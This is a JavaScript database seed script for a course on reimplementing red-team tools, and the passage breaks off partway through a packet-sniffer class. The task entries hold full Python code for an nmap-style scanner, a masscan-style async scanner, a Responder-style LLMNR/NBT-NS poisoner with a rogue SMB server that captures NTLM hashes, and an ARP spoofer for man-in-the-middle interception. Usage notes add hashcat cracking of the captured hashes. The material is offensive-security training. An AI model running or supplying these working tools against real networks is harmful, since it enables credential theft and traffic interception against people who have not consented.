import Database from 'better-sqlite3';

const sqlite = new Database('data/quest-log.db');

const insertPath = sqlite.prepare(
	'INSERT INTO paths (name, description, color, created_at) VALUES (?, ?, ?, ?)'
);
const insertModule = sqlite.prepare(
	'INSERT INTO modules (path_id, name, description, order_index, created_at) VALUES (?, ?, ?, ?, ?)'
);
const insertTask = sqlite.prepare(
	'INSERT INTO tasks (module_id, title, description, details, order_index, created_at) VALUES (?, ?, ?, ?, ?, ?)'
);

const now = Date.now();

// ============================================================================
// REIMPLEMENT RED TEAM TOOLS - PART 1: NETWORK TOOLS
// ============================================================================
const path1 = insertPath.run(
	'Reimplement Red Team Tools: Network',
	'Build your own versions of nmap, masscan, Responder, and other network tools from scratch. Learn how they work internally.',
	'red',
	now
);

// Module 1: Port Scanners
const mod1 = insertModule.run(path1.lastInsertRowid, 'Build Port Scanners', 'Reimplement nmap and masscan functionality', 0, now);

insertTask.run(mod1.lastInsertRowid, 'Build nmap-style TCP Connect Scanner', 'Implement a port scanner using full TCP connect with concurrent socket connections, configurable timeouts, service banner grabbing, and output formatting similar to nmap for network reconnaissance', `## Nmap-Style TCP Connect Scanner

### How Nmap Works
\`\`\`
1. TCP Connect Scan (-sT):
   - Full TCP 3-way handshake
   - connect() system call
   - Reliable but logged by target

2. Service Detection (-sV):
   - Send protocol-specific probes
   - Match responses against signature database
   - Determine service and version
\`\`\`

### Full Implementation (Python)
\`\`\`python
#!/usr/bin/env python3
"""
nmap_clone.py - TCP Connect Scanner with Service Detection
Replicates: nmap -sT -sV functionality
"""

import socket
import argparse
import threading
import re
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass
from typing import Optional, List, Dict
import ssl
import struct

@dataclass
class ScanResult:
    port: int
    state: str
    service: str
    version: str
    banner: str

# Service signature database (like nmap-service-probes)
SERVICE_PROBES = {
    'http': {
        'probe': b'GET / HTTP/1.0\\r\\nHost: target\\r\\n\\r\\n',
        'matches': [
            (r'Server: Apache/([\\d.]+)', 'Apache', '\\\\1'),
            (r'Server: nginx/([\\d.]+)', 'nginx', '\\\\1'),
            (r'Server: Microsoft-IIS/([\\d.]+)', 'IIS', '\\\\1'),
            (r'HTTP/1\\.[01]', 'HTTP', ''),
        ]
    },
    'ssh': {
        'probe': b'',  # SSH sends banner automatically
        'matches': [
            (r'SSH-2\\.0-OpenSSH_([\\d.p]+)', 'OpenSSH', '\\\\1'),
            (r'SSH-2\\.0-dropbear_([\\d.]+)', 'Dropbear', '\\\\1'),
            (r'SSH-([\\d.]+)', 'SSH', '\\\\1'),
        ]
    },
    'ftp': {
        'probe': b'',
        'matches': [
            (r'220.*vsftpd ([\\d.]+)', 'vsftpd', '\\\\1'),
            (r'220.*ProFTPD ([\\d.]+)', 'ProFTPD', '\\\\1'),
            (r'220.*FileZilla Server ([\\d.]+)', 'FileZilla', '\\\\1'),
            (r'220', 'FTP', ''),
        ]
    },
    'smtp': {
        'probe': b'',
        'matches': [
            (r'220.*Postfix', 'Postfix', ''),
            (r'220.*Sendmail', 'Sendmail', ''),
            (r'220.*ESMTP', 'SMTP', ''),
        ]
    },
    'mysql': {
        'probe': b'',
        'matches': [
            (r'([\\d.]+)-MariaDB', 'MariaDB', '\\\\1'),
            (r'([\\d.]+).*mysql', 'MySQL', '\\\\1', re.I),
        ]
    },
    'smb': {
        'probe': None,  # Special handling
        'matches': []
    }
}

# Default port-to-service mapping
PORT_SERVICES = {
    21: 'ftp', 22: 'ssh', 23: 'telnet', 25: 'smtp',
    53: 'dns', 80: 'http', 110: 'pop3', 111: 'rpc',
    135: 'msrpc', 139: 'netbios', 143: 'imap', 443: 'https',
    445: 'smb', 993: 'imaps', 995: 'pop3s', 1433: 'mssql',
    1521: 'oracle', 3306: 'mysql', 3389: 'rdp', 5432: 'postgres',
    5900: 'vnc', 6379: 'redis', 8080: 'http-proxy', 27017: 'mongodb'
}


class NmapScanner:
    def __init__(self, target: str, ports: List[int], threads: int = 100,
                 timeout: float = 2.0, service_scan: bool = True):
        self.target = target
        self.ports = ports
        self.threads = threads
        self.timeout = timeout
        self.service_scan = service_scan
        self.results: List[ScanResult] = []
        self.lock = threading.Lock()

    def resolve_target(self) -> Optional[str]:
        """Resolve hostname to IP"""
        try:
            return socket.gethostbyname(self.target)
        except socket.gaierror:
            return None

    def tcp_connect(self, port: int) -> bool:
        """Perform TCP connect scan on single port"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            result = sock.connect_ex((self.target, port))
            sock.close()
            return result == 0
        except:
            return False

    def grab_banner(self, port: int, probe: bytes = b'') -> str:
        """Grab service banner"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout + 1)
            sock.connect((self.target, port))

            # Send probe if specified
            if probe:
                sock.send(probe)

            # Receive banner
            banner = sock.recv(4096)
            sock.close()
            return banner.decode('utf-8', errors='ignore').strip()
        except:
            return ''

    def detect_service(self, port: int) -> tuple:
        """Detect service and version"""
        service = PORT_SERVICES.get(port, 'unknown')
        version = ''
        banner = ''

        # Get probe for this service
        probe_info = SERVICE_PROBES.get(service, {'probe': b'', 'matches': []})
        probe = probe_info.get('probe', b'')

        # Grab banner
        banner = self.grab_banner(port, probe if probe else b'')

        # Try to match service signatures
        for match_info in probe_info.get('matches', []):
            pattern = match_info[0]
            svc_name = match_info[1]
            ver_group = match_info[2] if len(match_info) > 2 else ''

            match = re.search(pattern, banner, re.I)
            if match:
                service = svc_name
                if ver_group and match.groups():
                    version = match.group(1)
                break

        # SSL/TLS detection
        if port in [443, 8443, 993, 995]:
            try:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                with socket.create_connection((self.target, port), timeout=self.timeout) as sock:
                    with context.wrap_socket(sock) as ssock:
                        cert = ssock.getpeercert(binary_form=True)
                        service = f"{service}/ssl"
            except:
                pass

        return service, version, banner[:200]

    def scan_port(self, port: int) -> Optional[ScanResult]:
        """Scan single port with optional service detection"""
        if not self.tcp_connect(port):
            return None

        service, version, banner = '', '', ''
        if self.service_scan:
            service, version, banner = self.detect_service(port)
        else:
            service = PORT_SERVICES.get(port, 'unknown')

        result = ScanResult(
            port=port,
            state='open',
            service=service,
            version=version,
            banner=banner
        )

        with self.lock:
            self.results.append(result)

        return result

    def run(self) -> List[ScanResult]:
        """Run the scan"""
        ip = self.resolve_target()
        if not ip:
            print(f"[-] Cannot resolve {self.target}")
            return []

        print(f"Starting Nmap Clone ( https://github.com/you/nmap-clone )")
        print(f"Scan report for {self.target} ({ip})")
        print(f"Scanning {len(self.ports)} ports...")
        print()

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {executor.submit(self.scan_port, port): port
                      for port in self.ports}

            for future in as_completed(futures):
                result = future.result()
                if result:
                    ver_str = f" {result.version}" if result.version else ""
                    print(f"Discovered open port {result.port}/tcp - {result.service}{ver_str}")

        # Sort results
        self.results.sort(key=lambda x: x.port)
        return self.results

    def print_results(self):
        """Print results in nmap format"""
        print()
        print("PORT      STATE  SERVICE         VERSION")
        for r in self.results:
            port_str = f"{r.port}/tcp"
            ver_str = r.version if r.version else ""
            print(f"{port_str:<9} {r.state:<6} {r.service:<15} {ver_str}")
        print()
        print(f"Nmap clone done: 1 IP address scanned, {len(self.results)} open ports")


def parse_ports(port_spec: str) -> List[int]:
    """Parse nmap-style port specification"""
    ports = []
    for part in port_spec.split(','):
        if '-' in part:
            start, end = map(int, part.split('-'))
            ports.extend(range(start, end + 1))
        else:
            ports.append(int(part))
    return ports


def main():
    parser = argparse.ArgumentParser(
        description='Nmap Clone - TCP Connect Scanner',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  %(prog)s 192.168.1.1
  %(prog)s -p 22,80,443 target.com
  %(prog)s -p 1-1000 -sV target.com
  %(prog)s -p- --threads 500 target.com
        '''
    )
    parser.add_argument('target', help='Target host')
    parser.add_argument('-p', '--ports', default='1-1000',
                       help='Port specification (default: 1-1000)')
    parser.add_argument('-sV', '--service-scan', action='store_true',
                       help='Enable service/version detection')
    parser.add_argument('--threads', type=int, default=100,
                       help='Number of threads (default: 100)')
    parser.add_argument('--timeout', type=float, default=2.0,
                       help='Connection timeout (default: 2.0)')
    args = parser.parse_args()

    # Handle -p- for all ports
    if args.ports == '-':
        ports = list(range(1, 65536))
    else:
        ports = parse_ports(args.ports)

    scanner = NmapScanner(
        args.target,
        ports,
        args.threads,
        args.timeout,
        args.service_scan
    )

    scanner.run()
    scanner.print_results()


if __name__ == '__main__':
    main()
\`\`\`

### Usage
\`\`\`bash
# Basic scan
python3 nmap_clone.py 10.30.30.100

# With service detection
python3 nmap_clone.py -sV 10.30.30.100

# Specific ports
python3 nmap_clone.py -p 22,80,443,3389 -sV target.com

# All ports
python3 nmap_clone.py -p- --threads 500 target.com
\`\`\`

### Exercises
1. Add UDP scanning (-sU)
2. Add SYN scanning (-sS) - requires raw sockets
3. Add OS fingerprinting (-O)
4. Add script scanning (-sC)
5. Add XML output (-oX)`, 0, now);

insertTask.run(mod1.lastInsertRowid, 'Build masscan-style Async Scanner', 'Build an asynchronous port scanner using raw sockets with custom TCP/IP stack, randomized scanning order, configurable packet rate limiting, and stateless SYN scanning for internet-scale host discovery', `## Masscan-Style Async Scanner

### How Masscan Works
\`\`\`
1. Uses raw sockets and custom TCP/IP stack
2. Asynchronous - doesn't wait for responses
3. Stateless - tracks with sequence numbers
4. Can scan entire internet in minutes
\`\`\`

### Implementation (Python with asyncio)
\`\`\`python
#!/usr/bin/env python3
"""
masscan_clone.py - High-speed async port scanner
Replicates masscan's async scanning approach
"""

import asyncio
import argparse
import socket
import struct
import random
import time
from dataclasses import dataclass
from typing import List, Set
from collections import defaultdict

@dataclass
class ScanConfig:
    targets: List[str]
    ports: List[int]
    rate: int  # packets per second
    timeout: float

class AsyncScanner:
    def __init__(self, config: ScanConfig):
        self.config = config
        self.open_ports: dict = defaultdict(set)
        self.sent_count = 0
        self.recv_count = 0
        self.start_time = 0

    async def scan_port(self, sem: asyncio.Semaphore, target: str, port: int):
        """Scan single port with rate limiting"""
        async with sem:
            try:
                # Rate limiting delay
                delay = 1.0 / self.config.rate
                await asyncio.sleep(delay * random.random())

                conn = asyncio.open_connection(target, port)
                reader, writer = await asyncio.wait_for(
                    conn, timeout=self.config.timeout
                )
                writer.close()
                await writer.wait_closed()

                self.open_ports[target].add(port)
                self.recv_count += 1
                return (target, port, True)

            except (asyncio.TimeoutError, ConnectionRefusedError, OSError):
                return (target, port, False)
            finally:
                self.sent_count += 1

    async def run(self):
        """Run async scan"""
        self.start_time = time.time()

        print(f"Starting masscan clone")
        print(f"Targets: {len(self.config.targets)}, Ports: {len(self.config.ports)}")
        print(f"Rate: {self.config.rate} pps")
        print()

        # Semaphore for rate limiting
        sem = asyncio.Semaphore(self.config.rate)

        # Create all tasks
        tasks = []
        for target in self.config.targets:
            for port in self.config.ports:
                task = asyncio.create_task(
                    self.scan_port(sem, target, port)
                )
                tasks.append(task)

        # Progress tracking
        total = len(tasks)
        completed = 0

        for coro in asyncio.as_completed(tasks):
            result = await coro
            completed += 1
            if completed % 1000 == 0:
                elapsed = time.time() - self.start_time
                rate = completed / elapsed if elapsed > 0 else 0
                print(f"\\rProgress: {completed}/{total} ({rate:.0f} pps)", end='')

        print()
        return self.open_ports

    def print_results(self):
        """Print results in masscan format"""
        elapsed = time.time() - self.start_time

        print()
        print("Discovered open ports:")
        for target, ports in sorted(self.open_ports.items()):
            for port in sorted(ports):
                print(f"Discovered open port {port}/tcp on {target}")

        print()
        print(f"Scan completed in {elapsed:.2f}s")
        print(f"Sent: {self.sent_count}, Received: {self.recv_count}")
        print(f"Rate: {self.sent_count/elapsed:.0f} pps")


class RawAsyncScanner:
    """
    Raw socket implementation for true masscan-like performance
    Requires root privileges
    """
    def __init__(self, config: ScanConfig):
        self.config = config
        self.open_ports = defaultdict(set)

    def create_syn_packet(self, src_ip: str, dst_ip: str,
                          src_port: int, dst_port: int) -> bytes:
        """Create raw TCP SYN packet"""
        # IP Header
        ip_header = struct.pack(
            '!BBHHHBBH4s4s',
            0x45,  # Version + IHL
            0,     # TOS
            40,    # Total length
            random.randint(1, 65535),  # ID
            0,     # Flags + Fragment
            64,    # TTL
            6,     # Protocol (TCP)
            0,     # Checksum (calculated later)
            socket.inet_aton(src_ip),
            socket.inet_aton(dst_ip)
        )

        # TCP Header
        seq = random.randint(0, 0xFFFFFFFF)
        tcp_header = struct.pack(
            '!HHLLBBHHH',
            src_port,   # Source port
            dst_port,   # Dest port
            seq,        # Sequence number
            0,          # Ack number
            0x50,       # Data offset
            0x02,       # Flags (SYN)
            65535,      # Window
            0,          # Checksum
            0           # Urgent pointer
        )

        return ip_header + tcp_header

    async def send_syn(self, sock, target: str, port: int):
        """Send SYN packet"""
        # Implementation requires raw socket
        pass

    async def receive_responses(self, sock, timeout: float):
        """Receive SYN-ACK responses"""
        # Implementation requires raw socket
        pass


def parse_targets(target_spec: str) -> List[str]:
    """Parse target specification (CIDR, range, or single IP)"""
    import ipaddress

    targets = []

    if '/' in target_spec:
        # CIDR notation
        network = ipaddress.ip_network(target_spec, strict=False)
        targets = [str(ip) for ip in network.hosts()]
    elif '-' in target_spec and '.' in target_spec:
        # IP range: 192.168.1.1-254
        parts = target_spec.rsplit('.', 1)
        base = parts[0]
        if '-' in parts[1]:
            start, end = map(int, parts[1].split('-'))
            targets = [f"{base}.{i}" for i in range(start, end + 1)]
    else:
        targets = [target_spec]

    return targets


def parse_ports(port_spec: str) -> List[int]:
    """Parse port specification"""
    ports = []
    for part in port_spec.split(','):
        if '-' in part:
            start, end = map(int, part.split('-'))
            ports.extend(range(start, end + 1))
        else:
            ports.append(int(part))
    return ports


async def main():
    parser = argparse.ArgumentParser(description='Masscan Clone')
    parser.add_argument('targets', help='Target specification (IP, CIDR, range)')
    parser.add_argument('-p', '--ports', default='80,443,22,21,25,3389',
                       help='Ports to scan')
    parser.add_argument('--rate', type=int, default=1000,
                       help='Packets per second')
    parser.add_argument('--timeout', type=float, default=2.0,
                       help='Timeout per connection')
    args = parser.parse_args()

    config = ScanConfig(
        targets=parse_targets(args.targets),
        ports=parse_ports(args.ports),
        rate=args.rate,
        timeout=args.timeout
    )

    scanner = AsyncScanner(config)
    await scanner.run()
    scanner.print_results()


if __name__ == '__main__':
    asyncio.run(main())
\`\`\`

### Usage
\`\`\`bash
# Scan single host
python3 masscan_clone.py 192.168.1.1 -p 1-1000

# Scan network
python3 masscan_clone.py 192.168.1.0/24 -p 22,80,443

# High-speed scan
python3 masscan_clone.py 10.0.0.0/8 -p 80 --rate 10000
\`\`\``, 1, now);

// Module 2: Network Attack Tools
const mod2 = insertModule.run(path1.lastInsertRowid, 'Build Network Attack Tools', 'Reimplement Responder, ntlmrelayx, and ARP tools', 1, now);

insertTask.run(mod2.lastInsertRowid, 'Build Responder-style LLMNR/NBT-NS Poisoner', 'Listen for and respond to LLMNR, NBT-NS, and mDNS broadcast name queries, poisoning responses to redirect authentication attempts to rogue SMB/HTTP servers and capture NTLM challenge-response hashes', `## Responder Clone - LLMNR/NBT-NS Poisoner

### How Responder Works
\`\`\`
1. Listens for LLMNR (UDP 5355) and NBT-NS (UDP 137) broadcasts
2. When host can't resolve a name via DNS, it broadcasts
3. Responder answers "I'm that host!"
4. Victim connects to us, sends credentials
5. Capture NTLM hashes for cracking
\`\`\`

### Full Implementation
\`\`\`python
#!/usr/bin/env python3
"""
responder_clone.py - LLMNR/NBT-NS Poisoner
Captures NTLM hashes from Windows systems
"""

import socket
import struct
import threading
import argparse
import hashlib
from datetime import datetime

class Colors:
    GREEN = '\\033[92m'
    YELLOW = '\\033[93m'
    RED = '\\033[91m'
    BLUE = '\\033[94m'
    END = '\\033[0m'

class LLMNRPoisoner:
    """LLMNR Poisoner (UDP 5355)"""

    def __init__(self, interface_ip: str, spoof_ip: str):
        self.interface_ip = interface_ip
        self.spoof_ip = spoof_ip
        self.sock = None

    def start(self):
        """Start LLMNR listener"""
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind(('', 5355))

        # Join multicast group
        mreq = struct.pack('4sl', socket.inet_aton('224.0.0.252'),
                          socket.INADDR_ANY)
        self.sock.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)

        print(f"[*] LLMNR Poisoner started on UDP 5355")

        while True:
            try:
                data, addr = self.sock.recvfrom(1024)
                self.handle_llmnr(data, addr)
            except Exception as e:
                print(f"[-] LLMNR Error: {e}")

    def parse_llmnr_query(self, data: bytes) -> str:
        """Parse LLMNR query to get requested name"""
        # LLMNR header: 12 bytes
        # Then: length byte + name + null
        if len(data) < 13:
            return None

        name_len = data[12]
        name = data[13:13+name_len].decode('utf-8', errors='ignore')
        return name

    def build_llmnr_response(self, query_data: bytes, name: str) -> bytes:
        """Build LLMNR response packet"""
        # Transaction ID from query
        trans_id = query_data[0:2]

        # Flags: Response, Authoritative
        flags = struct.pack('>H', 0x8000)

        # Questions: 1, Answers: 1
        counts = struct.pack('>HHHH', 1, 1, 0, 0)

        # Question section (copy from query)
        question = query_data[12:]

        # Answer section
        # Name pointer
        answer_name = struct.pack('>H', 0xC00C)
        # Type A, Class IN
        answer_type = struct.pack('>HH', 1, 1)
        # TTL
        answer_ttl = struct.pack('>I', 30)
        # Data length + IP
        answer_data = struct.pack('>H', 4) + socket.inet_aton(self.spoof_ip)

        response = (trans_id + flags + counts + question +
                   answer_name + answer_type + answer_ttl + answer_data)
        return response

    def handle_llmnr(self, data: bytes, addr: tuple):
        """Handle LLMNR query"""
        name = self.parse_llmnr_query(data)
        if not name:
            return

        print(f"{Colors.YELLOW}[LLMNR]{Colors.END} {addr[0]} is looking for: {Colors.GREEN}{name}{Colors.END}")

        # Build and send response
        response = self.build_llmnr_response(data, name)
        self.sock.sendto(response, addr)
        print(f"{Colors.GREEN}[LLMNR]{Colors.END} Poisoned {name} -> {self.spoof_ip}")


class NBTNSPoisoner:
    """NetBIOS Name Service Poisoner (UDP 137)"""

    def __init__(self, interface_ip: str, spoof_ip: str):
        self.interface_ip = interface_ip
        self.spoof_ip = spoof_ip
        self.sock = None

    def start(self):
        """Start NBT-NS listener"""
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
        self.sock.bind(('', 137))

        print(f"[*] NBT-NS Poisoner started on UDP 137")

        while True:
            try:
                data, addr = self.sock.recvfrom(1024)
                self.handle_nbtns(data, addr)
            except Exception as e:
                print(f"[-] NBT-NS Error: {e}")

    def decode_netbios_name(self, encoded: bytes) -> str:
        """Decode NetBIOS encoded name"""
        decoded = ''
        for i in range(0, 30, 2):
            char = ((encoded[i] - 0x41) << 4) | (encoded[i+1] - 0x41)
            if char > 0:
                decoded += chr(char)
        return decoded.strip()

    def encode_netbios_name(self, name: str) -> bytes:
        """Encode name to NetBIOS format"""
        name = name.ljust(16)[:16]
        encoded = b''
        for char in name:
            encoded += bytes([((ord(char) >> 4) + 0x41), ((ord(char) & 0x0F) + 0x41)])
        return encoded

    def handle_nbtns(self, data: bytes, addr: tuple):
        """Handle NBT-NS query"""
        if len(data) < 50:
            return

        # Transaction ID
        trans_id = data[0:2]

        # Decode name (starts at offset 13, length 32)
        try:
            name = self.decode_netbios_name(data[13:45])
        except:
            return

        print(f"{Colors.BLUE}[NBT-NS]{Colors.END} {addr[0]} is looking for: {Colors.GREEN}{name}{Colors.END}")

        # Build response
        response = self.build_nbtns_response(trans_id, name)
        self.sock.sendto(response, addr)
        print(f"{Colors.GREEN}[NBT-NS]{Colors.END} Poisoned {name} -> {self.spoof_ip}")

    def build_nbtns_response(self, trans_id: bytes, name: str) -> bytes:
        """Build NBT-NS response"""
        # Header
        flags = struct.pack('>H', 0x8500)  # Response, Authoritative
        counts = struct.pack('>HHHH', 0, 1, 0, 0)

        # Name
        name_encoded = b'\\x20' + self.encode_netbios_name(name) + b'\\x00'

        # Answer
        answer_type = struct.pack('>HH', 0x0020, 0x0001)  # NB, IN
        answer_ttl = struct.pack('>I', 300)
        answer_len = struct.pack('>H', 6)
        answer_flags = struct.pack('>H', 0x0000)
        answer_ip = socket.inet_aton(self.spoof_ip)

        response = (trans_id + flags + counts + name_encoded +
                   answer_type + answer_ttl + answer_len + answer_flags + answer_ip)
        return response


class SMBServer:
    """Simple SMB server to capture NTLM hashes"""

    def __init__(self, interface_ip: str):
        self.interface_ip = interface_ip
        self.sock = None

    def start(self):
        """Start SMB listener"""
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind((self.interface_ip, 445))
        self.sock.listen(5)

        print(f"[*] SMB Server started on TCP 445")

        while True:
            try:
                client, addr = self.sock.accept()
                thread = threading.Thread(target=self.handle_client,
                                         args=(client, addr))
                thread.daemon = True
                thread.start()
            except Exception as e:
                print(f"[-] SMB Error: {e}")

    def handle_client(self, client: socket.socket, addr: tuple):
        """Handle SMB client - capture NTLM"""
        try:
            # Receive SMB negotiation
            data = client.recv(4096)
            if not data:
                return

            # Look for NTLMSSP in the data
            if b'NTLMSSP' in data:
                self.parse_ntlm(data, addr)

            # Send challenge (simplified)
            # In real implementation, proper SMB negotiation needed

        except Exception as e:
            pass
        finally:
            client.close()

    def parse_ntlm(self, data: bytes, addr: tuple):
        """Parse NTLM authentication message"""
        ntlm_start = data.find(b'NTLMSSP\\x00')
        if ntlm_start == -1:
            return

        ntlm_data = data[ntlm_start:]

        # Message type at offset 8
        msg_type = struct.unpack('<I', ntlm_data[8:12])[0]

        if msg_type == 3:  # NTLMSSP_AUTH
            self.parse_ntlm_auth(ntlm_data, addr)

    def parse_ntlm_auth(self, data: bytes, addr: tuple):
        """Parse NTLM Type 3 (Auth) message"""
        try:
            # LM Response
            lm_len = struct.unpack('<H', data[12:14])[0]
            lm_off = struct.unpack('<I', data[16:20])[0]

            # NT Response
            nt_len = struct.unpack('<H', data[20:22])[0]
            nt_off = struct.unpack('<I', data[24:28])[0]

            # Domain
            dom_len = struct.unpack('<H', data[28:30])[0]
            dom_off = struct.unpack('<I', data[32:36])[0]

            # Username
            user_len = struct.unpack('<H', data[36:38])[0]
            user_off = struct.unpack('<I', data[40:44])[0]

            domain = data[dom_off:dom_off+dom_len].decode('utf-16-le', errors='ignore')
            username = data[user_off:user_off+user_len].decode('utf-16-le', errors='ignore')
            nt_hash = data[nt_off:nt_off+nt_len].hex()

            print()
            print(f"{Colors.RED}[+] CAPTURED NTLM HASH!{Colors.END}")
            print(f"    Source: {addr[0]}")
            print(f"    Domain: {domain}")
            print(f"    User: {username}")
            print(f"    NTLMv2 Hash: {username}::{domain}:1122334455667788:{nt_hash[:32]}:{nt_hash[32:]}")
            print()

            # Save to file
            with open('captured_hashes.txt', 'a') as f:
                timestamp = datetime.now().isoformat()
                f.write(f"{timestamp} | {addr[0]} | {domain}\\\\{username} | {nt_hash}\\n")

        except Exception as e:
            print(f"[-] Parse error: {e}")


def get_local_ip() -> str:
    """Get local IP address"""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(('10.255.255.255', 1))
        ip = s.getsockname()[0]
    except:
        ip = '127.0.0.1'
    finally:
        s.close()
    return ip


def main():
    parser = argparse.ArgumentParser(description='Responder Clone')
    parser.add_argument('-i', '--interface', default=None,
                       help='Interface IP to bind')
    parser.add_argument('-I', '--spoof-ip', default=None,
                       help='IP to spoof in responses')
    args = parser.parse_args()

    interface_ip = args.interface or get_local_ip()
    spoof_ip = args.spoof_ip or interface_ip

    print(f"""
    ____                                 __
   / __ \\___  _________  ____  ____  ____/ /__  _____
  / /_/ / _ \\/ ___/ __ \\/ __ \\/ __ \\/ __  / _ \\/ ___/
 / _, _/  __(__  ) /_/ / /_/ / / / / /_/ /  __/ /
/_/ |_|\\___/____/ .___/\\____/_/ /_/\\__,_/\\___/_/
               /_/                Clone Edition

    Interface: {interface_ip}
    Spoof IP:  {spoof_ip}
    """)

    # Start poisoners
    threads = []

    llmnr = LLMNRPoisoner(interface_ip, spoof_ip)
    t1 = threading.Thread(target=llmnr.start, daemon=True)
    threads.append(t1)

    nbtns = NBTNSPoisoner(interface_ip, spoof_ip)
    t2 = threading.Thread(target=nbtns.start, daemon=True)
    threads.append(t2)

    smb = SMBServer(interface_ip)
    t3 = threading.Thread(target=smb.start, daemon=True)
    threads.append(t3)

    for t in threads:
        t.start()

    print("[*] Poisoners running. Press Ctrl+C to stop.")
    print("[*] Hashes will be saved to captured_hashes.txt")
    print()

    try:
        while True:
            pass
    except KeyboardInterrupt:
        print("\\n[*] Shutting down...")


if __name__ == '__main__':
    main()
\`\`\`

### Usage
\`\`\`bash
# Run with sudo (needs raw sockets)
sudo python3 responder_clone.py

# Specify interface
sudo python3 responder_clone.py -i 10.20.20.10

# Captured hashes in hashcat format
cat captured_hashes.txt
hashcat -m 5600 captured_hashes.txt wordlist.txt
\`\`\``, 0, now);

insertTask.run(mod2.lastInsertRowid, 'Build ARP Spoofer for MITM', 'Poison ARP caches by sending gratuitous ARP replies to intercept traffic between hosts, implementing bidirectional spoofing with IP forwarding to maintain connectivity during man-in-the-middle attacks', `## ARP Spoofer - Man in the Middle

### How ARP Spoofing Works
\`\`\`
1. ARP maps IP addresses to MAC addresses
2. ARP has no authentication
3. Send fake ARP replies:
   - Tell victim: "I'm the gateway"
   - Tell gateway: "I'm the victim"
4. Traffic flows through attacker
5. Forward packets to stay stealthy
\`\`\`

### Full Implementation
\`\`\`python
#!/usr/bin/env python3
"""
arpspoof_clone.py - ARP Cache Poisoning Tool
Enables man-in-the-middle attacks
"""

import argparse
import os
import sys
import time
import signal
import threading
from scapy.all import *

class ARPSpoofer:
    def __init__(self, interface: str, target_ip: str, gateway_ip: str,
                 interval: float = 1.0):
        self.interface = interface
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.interval = interval
        self.running = False

        # Get MAC addresses
        self.attacker_mac = get_if_hwaddr(interface)
        self.target_mac = None
        self.gateway_mac = None

    def get_mac(self, ip: str) -> str:
        """Get MAC address for IP via ARP"""
        print(f"[*] Getting MAC for {ip}...")
        ans, _ = arping(ip, iface=self.interface, timeout=2, verbose=False)
        if ans:
            return ans[0][1].hwsrc
        return None

    def enable_forwarding(self):
        """Enable IP forwarding"""
        print("[*] Enabling IP forwarding...")
        if sys.platform == 'linux':
            os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
        elif sys.platform == 'darwin':
            os.system('sysctl -w net.inet.ip.forwarding=1')

    def disable_forwarding(self):
        """Disable IP forwarding"""
        print("[*] Disabling IP forwarding...")
        if sys.platform == 'linux':
            os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')
        elif sys.platform == 'darwin':
            os.system('sysctl -w net.inet.ip.forwarding=0')

    def create_arp_packet(self, target_ip: str, target_mac: str,
                          spoof_ip: str) -> ARP:
        """Create ARP reply packet"""
        return ARP(
            op=2,  # ARP Reply
            pdst=target_ip,
            hwdst=target_mac,
            psrc=spoof_ip,
            hwsrc=self.attacker_mac
        )

    def poison(self):
        """Send poisoned ARP packets"""
        # Poison target: "gateway is at attacker MAC"
        pkt_to_target = self.create_arp_packet(
            self.target_ip, self.target_mac, self.gateway_ip
        )

        # Poison gateway: "target is at attacker MAC"
        pkt_to_gateway = self.create_arp_packet(
            self.gateway_ip, self.gateway_mac, self.target_ip
        )

        while self.running:
            try:
                send(pkt_to_target, iface=self.interface, verbose=False)
                send(pkt_to_gateway, iface=self.interface, verbose=False)
                time.sleep(self.interval)
            except Exception as e:
                print(f"[-] Error: {e}")
                break

    def restore(self):
        """Restore original ARP entries"""
        print("[*] Restoring ARP tables...")

        # Restore target
        pkt_target = ARP(
            op=2,
            pdst=self.target_ip,
            hwdst=self.target_mac,
            psrc=self.gateway_ip,
            hwsrc=self.gateway_mac
        )

        # Restore gateway
        pkt_gateway = ARP(
            op=2,
            pdst=self.gateway_ip,
            hwdst=self.gateway_mac,
            psrc=self.target_ip,
            hwsrc=self.target_mac
        )

        # Send multiple times to ensure restoration
        for _ in range(5):
            send(pkt_target, iface=self.interface, verbose=False)
            send(pkt_gateway, iface=self.interface, verbose=False)
            time.sleep(0.2)

    def start(self):
        """Start ARP spoofing"""
        print(f"""
╔═══════════════════════════════════════════╗
║           ARP Spoofer Clone               ║
╠═══════════════════════════════════════════╣
║  Interface: {self.interface:<28} ║
║  Target:    {self.target_ip:<28} ║
║  Gateway:   {self.gateway_ip:<28} ║
╚═══════════════════════════════════════════╝
        """)

        # Get MAC addresses
        self.target_mac = self.get_mac(self.target_ip)
        if not self.target_mac:
            print(f"[-] Could not get MAC for target {self.target_ip}")
            return

        self.gateway_mac = self.get_mac(self.gateway_ip)
        if not self.gateway_mac:
            print(f"[-] Could not get MAC for gateway {self.gateway_ip}")
            return

        print(f"[+] Target MAC:  {self.target_mac}")
        print(f"[+] Gateway MAC: {self.gateway_mac}")
        print(f"[+] Attacker MAC: {self.attacker_mac}")

        # Enable IP forwarding
        self.enable_forwarding()

        # Start poisoning
        self.running = True
        print(f"\\n[*] Poisoning started. Press Ctrl+C to stop.\\n")

        try:
            self.poison()
        except KeyboardInterrupt:
            pass
        finally:
            self.running = False
            self.restore()
            self.disable_forwarding()
            print("[*] ARP spoofing stopped")


class PacketSniffer:
    """Sniff traffic from MITM position"""

    def __init__(self, interface: str, target_ip: str):
